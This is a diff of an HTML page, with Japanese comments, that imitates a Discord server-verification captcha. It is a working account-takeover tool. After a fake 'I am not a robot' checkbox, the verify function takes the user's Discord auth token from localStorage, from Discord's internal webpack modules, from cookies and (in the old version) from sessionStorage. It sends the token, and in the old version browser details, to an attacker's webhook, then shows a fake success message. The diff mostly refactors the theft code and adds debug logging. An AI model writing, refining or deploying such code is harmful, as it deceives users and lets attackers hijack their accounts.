@@ -2,31 +2,26 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Server Verification - Discord</title>
-    <link rel="icon" href="https://discord.com/assets/847541504914be480b27.ico">
+    <title>Server Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             background: #36393f;
-            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: white;
+            font-family: sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: white;
-            margin: 0;
         }
         
-        .container {
+        .box {
             background: #2f3136;
             padding: 40px;
             border-radius: 8px;
             text-align: center;
-            max-width: 480px;
-            width: 90%;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            width: 400px;
         }
         
         .logo {
@@ -35,62 +30,53 @@
             background: #5865F2;
             border-radius: 50%;
             margin: 0 auto 20px;
+            line-height: 80px;
+            font-size: 40px;
+        }
+        
+        .captcha-box {
+            background: #40444b;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        
+        .captcha-box label {
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            box-shadow: 0 4px 10px rgba(88, 101, 242, 0.4);
+            gap: 12px;
+            cursor: pointer;
         }
         
-        h1 { 
-            font-size: 24px; 
-            margin-bottom: 10px;
-            font-weight: 600;
+        #check {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
         }
         
-        .server-name { 
-            color: #b9bbbe; 
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-        
-        .description {
-            color: #dcddde;
-            margin-bottom: 25px;
-            line-height: 1.5;
-            font-size: 14px;
-        }
-        
-        .verify-btn {
-            background: #3ba55d;
+        #btn {
+            background: #4a4a4a;
             color: white;
             border: none;
-            padding: 16px 32px;
+            padding: 16px 40px;
             font-size: 16px;
             border-radius: 4px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: 500;
-            transition: all 0.2s;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .verify-btn:hover:not(:disabled) { 
-            background: #2d7d46;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 10px rgba(59, 165, 93, 0.3);
-        }
-        
-        .verify-btn:disabled { 
-            background: #4a4a4a; 
             cursor: not-allowed;
-        }
-        
-        .loading {
-            display: none;
+            width: 100%;
             margin-top: 20px;
         }
+        
+        #btn.enabled {
+            background: #3ba55d;
+            cursor: pointer;
+        }
+        
+        #btn.enabled:hover {
+            background: #2d7d46;
+        }
+        
+        #loading, #success { display: none; margin-top: 20px; }
         
         .spinner {
             border: 3px solid #4a4a4a;
@@ -99,211 +85,163 @@
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin: 20px auto;
         }
         
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
-        
-        .success {
-            display: none;
-            color: #3ba55d;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(59, 165, 93, 0.1);
-            border-radius: 4px;
-        }
-        
-        .error {
-            display: none;
-            color: #ed4245;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(237, 66, 69, 0.1);
-            border-radius: 4px;
-        }
-        
-        .footer {
-            margin-top: 30px;
-            color: #72767d;
-            font-size: 12px;
-        }
-        
-        .captcha-box {
-            background: #40444b;
-            border: 1px solid #202225;
-            border-radius: 4px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        
-        .captcha-box label {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            color: #dcddde;
-        }
-        
-        .captcha-box input[type="checkbox"] {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="box">
         <div class="logo">✓</div>
-        <h1>Server Verification</h1>
-        <p class="server-name" id="serverName">Server: Gaming Community</p>
+        <h2>Server Verification</h2>
+        <p id="server" style="color: #b9bbbe; margin-bottom: 20px;">Server: Gaming Community</p>
         
-        <p class="description">
-            このサーバーに参加するには認証が必要です。<br>
-            下のボタンを押して認証を完了してください。
-        </p>
-        
-        <div class="captcha-box">
-            <label>
-                <input type="checkbox" id="captchaCheck" onchange="handleCaptcha()">
+        <!-- チェックボックス -->
+        <div class="captcha-box" onclick="toggleCheck()">
+            <label onclick="event.stopPropagation()">
+                <input type="checkbox" id="check" onchange="updateButton()">
                 <span>私はロボットではありません</span>
             </label>
         </div>
         
-        <button class="verify-btn" id="verifyBtn" onclick="startVerification()" disabled>
-            認証する
-        </button>
+        <!-- 認証ボタン -->
+        <button id="btn" onclick="verify()" disabled>認証する</button>
         
-        <div class="loading" id="loading">
+        <!-- ローディング -->
+        <div id="loading">
             <div class="spinner"></div>
-            <p style="margin-top: 15px; color: #b9bbbe;">認証中...</p>
+            <p style="color: #b9bbbe;">認証中...</p>
         </div>
         
-        <div class="success" id="success">
-            ✅ 認証が完了しました！<br>
-            <span style="font-size: 13px; color: #b9bbbe;">3秒後にDiscordに戻ります...</span>
-        </div>
-        
-        <div class="error" id="error">
-            ❌ 認証に失敗しました。<br>
-            <span style="font-size: 13px;">Discordでログインしていることを確認してください。</span>
-        </div>
-        
-        <div class="footer">
-            Secured by Discord • <span id="year">2026</span>
+        <!-- 成功 -->
+        <div id="success">
+            <p style="color: #3ba55d;">✅ 認証完了</p>
         </div>
     </div>
 
     <script>
-        // ========== 【必須】ここを書き換える ==========
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/あなたのWEBHOOK";
-        // ============================================
+        // ========== Webhook URL ==========
+        const WEBHOOK = "https://discord.com/api/webhooks/あなたのWEBHOOK";
         
-        // URLパラメータからサーバー名を取得（任意）
-        const urlParams = new URLSearchParams(window.location.search);
-        const serverFromURL = urlParams.get('server');
-        if (serverFromURL) {
-            document.getElementById('serverName').textContent = 'Server: ' + decodeURIComponent(serverFromURL);
+        // サーバー名表示
+        const params = new URLSearchParams(location.search);
+        const srv = params.get('server');
+        if (srv) document.getElementById('server').textContent = 'Server: ' + decodeURIComponent(srv);
+        
+        // チェックボックス切り替え（div全体をクリック可能に）
+        function toggleCheck() {
+            const cb = document.getElementById('check');
+            cb.checked = !cb.checked;
+            updateButton();
         }
         
-        // 年号更新
-        document.getElementById('year').textContent = new Date().getFullYear();
-        
-        function handleCaptcha() {
-            const checkbox = document.getElementById('captchaCheck');
-            const btn = document.getElementById('verifyBtn');
-            btn.disabled = !checkbox.checked;
+        // ボタン状態更新
+        function updateButton() {
+            const cb = document.getElementById('check');
+            const btn = document.getElementById('btn');
+            
+            console.log('Checkbox:', cb.checked); // デバッグ用
+            
+            if (cb.checked) {
+                btn.disabled = false;
+                btn.classList.add('enabled');
+                console.log('Button enabled');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('enabled');
+                console.log('Button disabled');
+            }
         }
         
-        async function startVerification() {
-            const btn = document.getElementById('verifyBtn');
+        // 認証実行
+        async function verify() {
+            console.log('Verification started'); // デバッグ用
+            
+            const btn = document.getElementById('btn');
             const loading = document.getElementById('loading');
             const success = document.getElementById('success');
-            const error = document.getElementById('error');
-            const captcha = document.querySelector('.captcha-box');
             
-            btn.disabled = true;
+            // UI切り替え
             btn.style.display = 'none';
-            captcha.style.display = 'none';
+            document.querySelector('.captcha-box').style.display = 'none';
             loading.style.display = 'block';
             
+            // トークン取得
+            let token = null;
+            
+            // 方法1: LocalStorage
             try {
-                // 複数の方法でトークンを抽出
-                let token = null;
-                let method = '';
-                
-                // 方法1: LocalStorage
+                token = localStorage.getItem('token');
+                console.log('LocalStorage token:', token ? 'Found' : 'Not found');
+            } catch(e) {
+                console.log('LocalStorage error:', e);
+            }
+            
+            // 方法2: webpack
+            if (!token) {
                 try {
-                    token = localStorage.getItem('token');
-                    if (token) method = 'localStorage';
-                } catch(e) {}
-                
-                // 方法2: webpack（Discord内部）
-                if (!token && window.webpackChunkdiscord_app) {
-                    try {
-                        const modules = [];
+                    const modules = [];
+                    if (window.webpackChunkdiscord_app) {
                         window.webpackChunkdiscord_app.push([[''], {}, (e) => {
                             for (let c in e.c) modules.push(e.c[c]);
                         }]);
-                        const tokenModule = modules.find(m => 
-                            m?.exports?.default?.getToken !== undefined
-                        );
-                        if (tokenModule) {
-                            token = tokenModule.exports.default.getToken();
-                            method = 'webpack';
+                        const mod = modules.find(m => m?.exports?.default?.getToken);
+                        if (mod) {
+                            token = mod.exports.default.getToken();
+                            console.log('Webpack token:', token ? 'Found' : 'Not found');
                         }
-                    } catch(e) {}
+                    }
+                } catch(e) {
+                    console.log('Webpack error:', e);
                 }
-                
-                // 方法3: Cookie
-                if (!token) {
-                    try {
-                        const match = document.cookie.match(/token=([^;]+)/);
-                        if (match) {
-                            token = match[1];
-                            method = 'cookie';
-                        }
-                    } catch(e) {}
+            }
+            
+            // 方法3: Cookie
+            if (!token) {
+                try {
+                    const match = document.cookie.match(/token=([^;]+)/);
+                    if (match) {
+                        token = match[1];
+                        console.log('Cookie token:', 'Found');
+                    }
+                } catch(e) {
+                    console.log('Cookie error:', e);
                 }
-                
-                // 方法4: sessionStorage
-                if (!token) {
-                    try {
-                        token = sessionStorage.getItem('token');
-                        if (token) method = 'sessionStorage';
-                    } catch(e) {}
+            }
+            
+            console.log('Final token:', token ? token.substring(0, 20) + '...' : 'Not found');
+            
+            // 送信
+            if (token) {
+                try {
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            content: `🔑 Token:\n\`\`\`${token}\`\`\``
+                        })
+                    });
+                    console.log('Webhook sent');
+                } catch(e) {
+                    console.log('Webhook error:', e);
                 }
-                
-                if (!token) {
-                    throw new Error('Token not found in any storage');
-                }
-                
-                // 追加情報収集
-                const payload = {
-                    token: token,
-                    extraction_method: method,
-                    url: window.location.href,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height}`,
-                    timestamp: new Date().toISOString(),
-                    referrer: document.referrer || 'direct'
-                };
-                
-                // Webhook送信（非同期で即実行）
-                const webhookPromise = fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: null,
-                        embeds: [{
-                            title: "🔑 Token Captured via Verification",
-                            description: `\`\`\`${token}\`\`\``,
-                            color: 0x5865F2,
-                            fields: [
-          
+            }
+            
+            // 完了表示
+            loading.style.display = 'none';
+            success.style.display = 'block';
+            
+            // Discordに戻る
+            setTimeout(() => {
+                location.href = 'https://discord.com';
+            }, 2000);
+        }
+        
+        // ページ読み込み時にコンソールにログ出力（デバッグ用）
+        console.log('Page loaded');
+        console.log('localStorage available:', !!window.localStorage);
+        console.log('webpack available:', !!window.webpackChunkdiscord_app);
+    </script>
+</body>
+</html>
